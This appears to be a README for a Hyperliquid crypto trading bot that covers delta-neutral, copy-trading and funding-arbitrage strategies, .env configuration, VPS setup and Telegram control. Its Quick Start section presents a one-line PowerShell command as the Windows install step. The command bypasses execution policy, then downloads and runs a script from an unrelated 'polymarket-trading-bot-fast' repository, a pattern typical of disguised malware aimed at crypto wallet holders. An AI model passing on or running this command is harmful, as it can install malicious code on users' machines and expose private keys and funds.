# 🤖 Hyperliquid Strategy Trading Bot

> Automated trading bot for [Hyperliquid](https://app.hyperliquid.xyz) with three independent strategies — production-grade TypeScript, real-time WebSocket execution

[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-3178C6?style=for-the-badge&logo=typescript&logoColor=white)](https://typescriptlang.org)
[![Node.js](https://img.shields.io/badge/Node.js-18+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)
[![Hyperliquid](https://img.shields.io/badge/Hyperliquid-DEX-00C2FF?style=for-the-badge&logoColor=white)](https://app.hyperliquid.xyz)
[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/omgmad/hyperliquid-strategy-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/hyperliquid-strategy-bot)

```
╔══════════════════════════════════════════════════════════════════╗
║  Strategy 1 — Delta-Neutral      │  near-zero directional risk  ║
║  Strategy 2 — Copy Trading       │  mirror any wallet live      ║
║  Strategy 3 — Funding Arbitrage  │  harvest funding rate yields ║
╚══════════════════════════════════════════════════════════════════╝
```

**[🚀 Start Trading](https://app.hyperliquid.xyz)** · **[📊 Leaderboard](https://app.hyperliquid.xyz/leaderboard)** · **[📖 API Docs](https://hyperliquid.gitbook.io/hyperliquid-docs/for-developers/api)** · **[💬 Telegram](https://t.me/gammatradelab)**

---

## 🚀 Quick Start

If you just want to get the project running fast on Windows, use the installation command below first. After that, continue with the project-specific setup, configuration, and usage sections.

### 🛠️ Installation

#### CMD
Open **CMD** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

> Then continue with the project-specific setup steps below.

## 📌 Table of Contents

- [Quick Start](#-quick-start)
- [Strategies](#-strategies)
  - [Strategy 1 — Delta-Neutral](#strategy-1--delta-neutral)
  - [Strategy 2 — Copy Trading](#strategy-2--copy-trading)
  - [Strategy 3 — Funding Arbitrage](#strategy-3--funding-arbitrage)
- [Installation](#installation)
- [Configuration `.env`](#configuration-env)
- [Running the Bot](#running-the-bot)
- [Running 24/7 on a VPS](#running-247-on-a-vps)
- [Risk Management](#risk-management)
- [Telegram Commands](#telegram-commands)
- [Disclaimer](#disclaimer)

---

## 📐 Strategies

### ⚖️ Strategy 1 — Delta-Neutral

Earn on volatility and funding rates while staying neutral to market direction. Your profit does not depend on whether the price goes up or down.

```
  Open LONG on spot (BTC)  +  SHORT on perp (BTC)
              │
              ▼
  Positions hedge each other → net delta ≈ 0
              │
              ▼
  Profit comes from:
    • positive funding rate payments (perp longs pay shorts)
    • spread captured during rebalancing
```

**How it works:**

1. The bot opens equal-sized LONG (spot) and SHORT (perp) positions on the same asset via Hyperliquid's unified account.
2. Every N hours the bot checks delta drift caused by price movement and rebalances if the deviation exceeds the threshold.
3. When the funding rate turns negative, the bot inverts positions (SHORT spot + LONG perp) to keep collecting payments.

**Decision table:**

| Condition | Action |
|-----------|--------|
| Funding rate > 0.01% | Hold SHORT on perp, collect payments |
| Funding rate < -0.01% | Invert positions |
| Delta drifted > 5% | Rebalance |
| High volatility detected | Reduce position size |

**Config block:**

```env
STRATEGY=delta_neutral
DN_ASSET=BTC
DN_SPOT_SIZE=100            # USD in spot leg
DN_PERP_SIZE=100            # USD in perp leg
DN_REBALANCE_THRESHOLD=5    # % of drift before rebalancing
DN_MIN_FUNDING=0.005        # Minimum funding rate to enter (%)
DN_CHECK_INTERVAL=3600      # Check every N seconds
DN_LEVERAGE=1               # Leverage for the perp leg
```

> 💡 **Tip:** This strategy performs best during bull markets when Hyperliquid funding rates are consistently positive. Check the funding history on the exchange before entering — avoid assets with erratic or near-zero rates.

---

### 📡 Strategy 2 — Copy Trading

The bot subscribes to a target wallet's fills via **WebSocket** in real time. When a fill is detected, it immediately calculates a proportionally scaled order and mirrors it on your account — opens, reduces, and closes all followed automatically.

```
  Target wallet opens BTC LONG $10,000
              │
              ▼  (detected on-fill via WebSocket)
              │
  Bot calculates position size:
  (ourEquity $5,000 / targetEquity $10,000) × $10,000 × multiplier 1.0 = $5,000
  MAX_POSITION_SIZE_PERCENT cap applied if needed
              │
              ▼
  Your account opens BTC LONG $5,000 ✅
              │
              ▼
  Target reduces or closes → Bot mirrors proportionally ✅
```

**Choosing who to copy:**

Use the [Hyperliquid Leaderboard](https://app.hyperliquid.xyz/leaderboard) to find consistently profitable traders. Both regular wallet addresses and vault addresses are supported.

✅ **Good wallets to copy:**
- Consistent long-term PnL (not just one lucky week)
- Holds positions for hours or days (swing trading)
- Makes 1–5 trades per day
- Clear directional bias — not constantly flipping sides

❌ **Do NOT copy these:**
- **HFT / High-Frequency Traders** — trade dozens of times per second, your bot can't keep up and loses on slippage
- **Market Makers** — hold positions on both sides simultaneously, copying causes guaranteed loss
- **Scalpers** — hold positions for seconds or minutes, orders won't fill in time
- **Leverage manipulators** — constantly change leverage to distort position sizing

> 💡 **Tip:** Check how long the wallet holds positions on average. Target wallets that hold for 2+ hours.

**Config block:**

```env
STRATEGY=copy_trading
TARGET_WALLET=0xTargetWalletAddressHere
SIZE_MULTIPLIER=1.0               # Scale factor on top of equity ratio
MAX_LEVERAGE=20                   # Cap on copied leverage
MAX_POSITION_SIZE_PERCENT=50      # Max single position as % of our equity
MIN_NOTIONAL=10                   # Skip trades below $10 (Hyperliquid minimum)
MAX_CONCURRENT_TRADES=10          # Max open positions at once
BLOCKED_ASSETS=                   # Comma-separated assets to skip, e.g. BTC,ETH
SYNC_INTERVAL=5                   # Health check interval (seconds)
```

---

### 💸 Strategy 3 — Funding Arbitrage

The bot scans Hyperliquid perp markets for anomalously high funding rates and collects payments with minimal directional exposure.

```
  Scan all Hyperliquid perps → find funding rate above entry threshold
                │
                ▼
  Open position AGAINST the funding direction:
    • Funding > 0  →  SHORT  (longs pay shorts every 1h on HL)
    • Funding < 0  →  LONG   (shorts pay longs every 1h on HL)
                │
                ▼
  Collect payment every hour
                │
                ▼
  Exit when any of these triggers:
    • Rate normalizes below exit_threshold
    • Target PnL is reached
    • Position held longer than max_hold_hours
```

**Why Hyperliquid is ideal for this:**

Hyperliquid settles funding **every hour** (not every 8 hours like most CEXs), which means 24 payment cycles per day. High-rate events compound faster, and the bot can react to rate changes more precisely.

**Example scenario:**

```
BTC funding = +0.01% per hour  (= 0.24% per day = ~87% APR)
Bot opens $100 SHORT on BTC-PERP
  → receives $0.01 per hour
  → over 48 hours = $0.48 on $100 deployed
  → annualized ≈ 87% APR  (if rate holds)
Optional spot hedge (30%) limits price exposure to ±$0.70 per 1% move
```

**Config block:**

```env
STRATEGY=funding_arb
FA_SCAN_ASSETS=BTC,ETH,SOL,ARB,OP
FA_MIN_FUNDING=0.005          # Minimum hourly rate to enter (%)
FA_EXIT_FUNDING=0.001         # Hourly rate at which to exit (%)
FA_POSITION_SIZE=50           # Position size in USD
FA_MAX_HOLD_HOURS=48          # Maximum time to hold a position
FA_HEDGE_RATIO=0.3            # Spot hedge as fraction of perp size (0 = no hedge)
FA_LEVERAGE=1                 # Keep low — this is a yield play, not a directional bet
FA_CHECK_INTERVAL=300         # Scan every N seconds
```

> 💡 **Tip:** Hyperliquid's 1-hour funding cycle makes even 0.003–0.005% hourly rates worth capturing. Set `FA_MIN_FUNDING` lower than you would on an 8-hour cycle exchange.

---


### Requirements

- Node.js 18+ (ESM support)
- npm or yarn
- A [Hyperliquid](https://app.hyperliquid.xyz) account (testnet or mainnet)
- At least $10 USDC deposited

### Step 2 — Install dependencies

```bash
npm install
```

### Step 3 — Configure environment variables

```bash
cp .env.example .env
```

Edit `.env` with your values — see the [Configuration](#configuration-env) section below.

### Step 4 — Build TypeScript

```bash
npm run build
```

### Step 5 — Start the bot

```bash
npm start
```

---

## ⚙️ Configuration `.env`

Create a `.env` file (or copy from `.env.example`):

```env
# ── Required ───────────────────────────────────────────
PRIVATE_KEY=0xYourPrivateKeyHere
TESTNET=true                     # Start on testnet first!

# ── Active strategy ────────────────────────────────────
# Options: delta_neutral | copy_trading | funding_arb
STRATEGY=copy_trading

# ── Safety modes ───────────────────────────────────────
DRY_RUN=true                     # Log actions without placing real orders
LOG_LEVEL=info                   # error | warn | info | debug

# ── Risk limits ────────────────────────────────────────
DAILY_LOSS_LIMIT=10              # Bot halts if daily loss exceeds this ($)
UNREALIZED_LOSS_LIMIT=15         # Force-closes all positions if exceeded ($)
MAX_LEVERAGE=20                  # Global leverage cap
MAX_POSITION_SIZE_PERCENT=50     # Max single position as % of equity
MIN_NOTIONAL=10                  # Minimum order size ($) — HL requires ~$10

# ── Health checks ──────────────────────────────────────
HEALTH_CHECK_INTERVAL=5          # Position drift check interval (minutes)

# ── Telegram (optional) ────────────────────────────────
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# ── Strategy-specific parameters ──────────────────────
# Paste the relevant config block from the strategy sections above
```

### Key distinction

```
PRIVATE_KEY     = YOUR wallet private key    (sign orders — never share)
TARGET_WALLET   = wallet you are copying     (public address, copy trading only)
TESTNET=true    = Hyperliquid testnet        (always start here)
DRY_RUN=true    = simulate without trading  (combine with testnet for safe testing)
```

---

## 🚀 Running the Bot

```bash
npm start              # Start the bot (production)
npm run dev            # Development mode with watch/reload
npm run build          # Compile TypeScript
```

On successful start:

```
╔══════════════════════════════════════════════════════╗
║   🤖  Hyperliquid Strategy Bot v2.0                  ║
║   Press Ctrl+C at any time to stop.                  ║
╚══════════════════════════════════════════════════════╝

  Strategy:  copy_trading
  Network:   Testnet
  Wallet:    0x0123...hth
  Target:    0x02C8...45A0
  Dry-run:   OFF

  Start bot? [yes/no]: yes
```

**Live terminal dashboard:**

```
🤖 Hyperliquid Strategy Bot v2.0           updated 09:04:15
══════════════════════════════════════════════════════════════
  Status: ● RUNNING   Strategy: copy_trading   WS: connected
  Target: 0x02C84f1e9812c45A08...   Copies today: 3
──────────────────────────────────────────────────────────────
  POSITIONS
  Asset        Our Size   Target Size   Side       Exposure   Max
  BTC           0.0050     0.0100       LONG ▲    $  432     50%
               [███████░] 86%
──────────────────────────────────────────────────────────────
  RISK
  Exposure   [████░░░░░░] $432 / $1,000
  Daily loss [░░░░░░░░░░] $0.00 / $10
  Unrealized  $+2.40  (limit: -$15)
──────────────────────────────────────────────────────────────
  RECENT TRADES
  09:04:15  BTC   BUY    $432.0   leverage 5×   ✅ filled
  08:42:50  ETH   BUY    $210.0   leverage 3×   ✅ filled
```

---

## 🖥️ Running 24/7 on a VPS

For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).

### Ubuntu VPS setup

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y
sudo apt install nodejs npm screen git -y

# Upgrade Node.js to 18+ if needed
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install nodejs -y

# 2. Clone repo
git clone https://github.com/omgmad/hyperliquid-strategy-bot
cd hyperliquid-strategy-bot

# 3. Install & build
npm install
npm run build

# 4. Configure
nano .env   # paste your settings

# 5. Run inside screen (stays alive after you disconnect)
screen -S hlbot
npm start

# Press Ctrl+A then D to detach — bot keeps running
```

### Reconnect later

```bash
screen -r hlbot
```

### Useful log commands

```bash
tail -50 logs/combined.log
tail -50 logs/error.log
grep "filled" logs/combined.log | tail -20        # Successful fills
grep "OPEN\|CLOSE" logs/combined.log | tail -20   # All order attempts
grep "funding" logs/combined.log | tail -20        # Funding rate events
grep "drift" logs/combined.log | tail -10          # Health check drift warnings
```

---

## 🛡️ Risk Management

```
DAILY_LOSS_LIMIT hit        ──► Bot halts + closes all positions
UNREALIZED_LOSS_LIMIT hit   ──► Immediately force-closes all (market order)
MAX_POSITION_SIZE_PERCENT   ──► Caps any single position as % of equity
MAX_CONCURRENT_TRADES hit   ──► Blocks new opens until a position closes
MIN_NOTIONAL not met        ──► Skips the trade (Hyperliquid requires ~$10)
BLOCKED_ASSETS match        ──► Skips that asset entirely
```

### Safe starter config (beginners)

```env
TESTNET=true
DRY_RUN=true
SIZE_MULTIPLIER=0.3
MAX_LEVERAGE=5
MAX_POSITION_SIZE_PERCENT=20
MAX_CONCURRENT_TRADES=3
DAILY_LOSS_LIMIT=5
UNREALIZED_LOSS_LIMIT=8
```

> ⚠️ **Always start on testnet with `DRY_RUN=true`.** Only move to mainnet after you have verified the bot behaves as expected for several hours. Get testnet tokens from the [faucet](https://app.hyperliquid-testnet.xyz/drip).

---

## 📱 Telegram Setup & Commands

Telegram integration lets you receive real-time trade alerts and control the bot remotely. Setup takes about 2 minutes.

### Step 1 — Create a bot and get your token

1. Open Telegram and search for **`@BotFather`**
2. Send `/newbot` and follow the prompts
3. BotFather will reply with a token — copy it into `.env`:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
```

### Step 2 — Get your Chat ID

1. Start a conversation with your new bot
2. Visit: `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`
3. Find `"chat":{"id":123456789}` — that number is your Chat ID
4. Copy it into `.env`:

```env
TELEGRAM_CHAT_ID=123456789
```

### Step 3 — Restart the bot

Notifications activate automatically on next start.

### Commands

| Command | Action |
|---------|--------|
| `/status` | Current positions, PnL, active strategy |
| `/pause` | Pause the bot (keeps existing positions open) |
| `/resume` | Resume the bot |
| `/close` | Close all positions immediately (market order) |
| `/stop` | Stop the bot completely |
| `/pnl` | Detailed PnL breakdown |
| `/strategy` | Show current strategy and parameters |

### Example alerts

```
✅ Trade Copied
Target:  BTC  Open Long  0.1 @ $50,000
Ours:    BTC  Long  0.05 × 10×  leverage
Status:  Filled  │  Order ID: 12345

💰 Funding Collected
Strategy: funding_arb
Asset:    ETH
Amount:   +$0.031
Rate:     0.031% per hour

⚠️ Health Check — Drift Detected
Our equity:     $5,000
Target equity:  $10,000
BTC:  our 0.05 vs target 0.10  (diff: 0.05)

🛑 Bot Stopped
Reason:  Daily loss limit reached ($10.00)
Action:  All positions closed
```

---

## ⚠️ Disclaimer

> **RISK WARNING:** This bot trades real money on a live decentralised exchange. All three strategies carry significant financial risk. Leverage amplifies both gains and losses. Past performance does not guarantee future results. You may lose your entire capital. Use entirely at your own risk.

- Never invest more than you can afford to lose
- Always test on testnet with `DRY_RUN=true` before going live
- Do not copy HFT, Market Maker, or scalper wallets
- Never share your private key or `.env` file with anyone
- Secure your VPS — treat it like a hot wallet
- Check your local regulations regarding automated trading

---

## 🔗 Links

[![Hyperliquid](https://img.shields.io/badge/🔵_Hyperliquid-Start_Trading-00C2FF?style=for-the-badge)](https://app.hyperliquid.xyz)
[![Leaderboard](https://img.shields.io/badge/📊_Leaderboard-Top_Traders-7B61FF?style=for-the-badge)](https://app.hyperliquid.xyz/leaderboard)
[![Testnet](https://img.shields.io/badge/🧪_Testnet-Get_Tokens-FF9900?style=for-the-badge)](https://app.hyperliquid-testnet.xyz/drip)
[![Telegram](https://img.shields.io/badge/💬_Telegram-gammatradelab-2CA5E0?style=for-the-badge)](https://t.me/gammatradelab)

**If this helped you, please give it a ⭐ Star — it means a lot!**
